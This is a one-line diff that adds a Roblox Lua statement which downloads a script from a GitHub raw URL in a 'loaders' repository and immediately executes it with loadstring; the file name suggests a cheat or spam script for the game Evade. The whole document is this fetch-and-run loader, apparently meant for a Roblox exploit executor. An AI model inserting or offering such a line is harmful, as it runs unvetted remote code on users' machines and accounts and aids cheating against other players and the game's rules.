@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/hlwn-evade-spam1-eotc0ek6kb8jzl.lua"))()
